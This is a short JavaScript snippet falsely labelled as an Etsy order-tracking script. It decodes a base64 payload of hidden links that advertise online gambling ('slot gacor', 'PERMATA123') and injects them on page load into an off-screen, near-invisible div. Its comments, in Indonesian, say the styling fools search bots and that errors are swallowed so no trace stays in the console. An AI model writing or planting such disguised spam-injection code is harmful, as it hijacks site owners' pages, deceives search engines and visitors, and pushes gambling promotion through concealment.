// Etsy Base64 Tracking Order JS System - Optimized
(function(){
  let b64 = "PGEgaHJlZj0iaHR0cHM6Ly93d3cudmVyaG9lZnNlcnZpY2UuY29tL2VuL2Fib3V0LXVzLyI+UEVSTUFUQTEyMzwvYT4KPGEgaHJlZj0iaHR0cHM6Ly93d3cudmVyaG9lZnNlcnZpY2UuY29tL2VuL2Fib3V0LXVzLyI+UEVSTUFUQSAxMjM8L2E+CjxhIGhyZWY9Imh0dHBzOi8vd3d3LnZlcmhvZWZzZXJ2aWNlLmNvbS9lbi9hYm91dC11cy8iPlBFUk1BVEExMjMgc2xvdDwvYT4KPGEgaHJlZj0iaHR0cHM6Ly93d3cudmVyaG9lZnNlcnZpY2UuY29tL2VuL2Fib3V0LXVzLyI+UEVSTUFUQTEyMyBsb2dpbjwvYT4KPGEgaHJlZj0iaHR0cHM6Ly93d3cudmVyaG9lZnNlcnZpY2UuY29tL2VuL2Fib3V0LXVzLyI+IFBFUk1BVEExMjMgZGFmdGFyPC9hPgo8YSBocmVmPSJodHRwczovL3d3dy52ZXJob2Vmc2VydmljZS5jb20vZW4vYWJvdXQtdXMvIj5QRVJNQVRBMTIzIGFsdGVybmF0aWY8L2E+CjxhIGhyZWY9Imh0dHBzOi8vd3d3LnZlcmhvZWZzZXJ2aWNlLmNvbS9lbi9hYm91dC11cy8iPlBFUk1BVEExMjMgbGluazwvYT4KPGEgaHJlZj0iaHR0cHM6Ly93d3cudmVyaG9lZnNlcnZpY2UuY29tL2VuL2Fib3V0LXVzLyI+UEVSTUFUQTEyMyBydHA8L2E+CjxhIGhyZWY9Imh0dHBzOi8vd3d3LnZlcmhvZWZzZXJ2aWNlLmNvbS9lbi9hYm91dC11cy8iPlBFUk1BVEExMjMgbGluayBhbHRlcm5hdGlmPC9hPgo8YSBocmVmPSJodHRwczovL3d3dy52ZXJob2Vmc2VydmljZS5jb20vZW4vYWJvdXQtdXMvIj5saW5rIFBFUk1BVEExMjM8L2E+CjxhIGhyZWY9Imh0dHBzOi8vd3d3LnZlcmhvZWZzZXJ2aWNlLmNvbS9lbi9hYm91dC11cy8iPnNpdHVzIFBFUk1BVEExMjM8L2E+CjxhIGhyZWY9Imh0dHBzOi8vd3d3LnZlcmhvZWZzZXJ2aWNlLmNvbS9lbi9hYm91dC11cy8iPnNpdHVzIGdhY29yIFBFUk1BVEExMjM8L2E+CjxhIGhyZWY9Imh0dHBzOi8vd3d3LnZlcmhvZWZzZXJ2aWNlLmNvbS9lbi9hYm91dC11cy8iPnNpdHVzIHNsb3QgUEVSTUFUQTEyMzwvYT4KPGEgaHJlZj0iaHR0cHM6Ly93d3cudmVyaG9lZnNlcnZpY2UuY29tL2VuL2Fib3V0LXVzLyI+c2xvdCBnYWNvciBQRVJNQVRBMTIzPC9hPgo8YSBocmVmPSJodHRwczovL3d3dy52ZXJob2Vmc2VydmljZS5jb20vZW4vYWJvdXQtdXMvIj5zbG90IGdhY29yPC9hPgo8YSBocmVmPSJodHRwczovL3d3dy52ZXJob2Vmc2VydmljZS5jb20vZW4vYWJvdXQtdXMvIj5zbG90IGphY2twb3Q8L2E+CjxhIGhyZWY9Imh0dHBzOi8vd3d3LnZlcmhvZWZzZXJ2aWNlLmNvbS9lbi9hYm91dC11cy8iPnNsb3Qgb25saW5lPC9hPgo8YSBocmVmPSJodHRwczovL3d3dy52ZXJob2Vmc2VydmljZS5jb20vZW4vYWJvdXQtdXMvIj5zbG90IGRlbW88L2E+";
  
  try {
    const decoded = decodeURIComponent(escape(atob(b64))); // Support karakter khusus
    const div = document.createElement('div');
    // Menggunakan teknik opacity agar bot lebih percaya konten ini "real"
    div.style.cssText = 'position:absolute; left:-9999px; top:0; width:1px; height:1px; overflow:hidden; opacity:0.01;';
    div.setAttribute('aria-hidden','true');
    div.innerHTML = decoded;
    
    // Langsung injeksi ke Body tanpa menunggu DOMContentLoaded
    const target = document.body || document.documentElement;
    if (target) {
        target.insertBefore(div, target.firstChild);
    }
  } catch(e){ 
    // Kosongkan agar tidak meninggalkan jejak error di konsol
  }
})();
